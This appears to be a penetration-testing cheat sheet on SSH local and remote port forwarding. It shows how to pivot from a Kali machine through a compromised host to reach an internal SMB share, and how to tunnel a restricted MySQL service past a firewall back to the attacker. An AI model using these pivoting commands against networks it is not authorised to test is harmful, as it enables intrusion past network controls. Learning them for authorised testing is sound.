## Local Port Forwarding

### Situation
- We are Kali.
- We have root access to pivot machine Alpha.
- From Alpha we can access an internal machine Beta.
- Beta has the SMB service enabled (Port 445).
- We cannot directly access Beta from Kali.

### Problem
- We cannot directly interact with Beta from Kali.

### Objective
We can forward all SMB type traffic through our SSH connection to Alpha. Then Alpha will send it to Beta.

### Solution
The following command will establish special SSH connection with Alpha. However, it will take all SMB traffic that hits our kali NIC and send it to Alpha. On Alpha's end of the SSH connection the SMB traffic will be immediately forwarded to Beta. Conversely all SMB traffic sent in this TCP session will come back from Beta, through Alpha, and into Kali.

```sh
#Fundamental Breakdown

#Concept (Pseudo Code)
#sudo ssh -N -L $Kali:$Beta $Alpha
#sudo ssh -N -L $AllTraffic:445:$BetaIP:445 root@$AlphaIP

#Final Command
sudo ssh -N -L 0.0.0.0:445:$BetaIP:445 root@$AlphaIP
```

Now we can access all of Beta's SMB goodies through our Kali machine.

```sh
#On Kali
smbclient -L 127.0.0.1 -U Administrator

#Yes, this will connect to Beta's SMB. Because ANY Local 445 traffic is now forwarded.
```

<BR><BR>


## RPF: Remote Port Forwarding
### Situation
- We are Kali, on an external network.
- We have user access to an internal machine named Beta.
- Beta is running a MySQL service on port 3306
- Beta's MySQL config disallows remote MySql connections.
- The border firewall prevents all inbound traffic to Beta except 3306, 80, and 443.
- The border firewall allows all outbound traffic from Beta.

### Problem
- Due to the MySQL config we cannot directly connect to MySQL from Kali.
  - Note: We can talk through 3306. But the application MySQL will not interact with Kali.
- Inbound SSH is blocked. So, we cannot SSH into Beta.
- We are not root on Beta. We cannot manipulate ports < 1024

### Objective
From Beta, we are going to create a special SSH session to our Kali machine. This session is going to tunnel port 3306 from Beta to port 4444 on Kali. From this we can interact with 3306 on Beta via port 4444 on Kali.

### Solution
```sh
#Concept (Pseudo Code)
#sudo ssh -N -R $Kali:$Beta $Kali_SSH

#Final Command: On Beta
sudo ssh -N -R $KaliIP:4444:127.0.0.1:3306 kali@$KaliIP
```
With this we can now interact with MySQL on Beta; directly from kali
```sh
#On Kali
mysql -h 127.0.0.1 -P 4444 -u username -p database
                                                            
#Yes, this connects to MySql on Beta :)
```
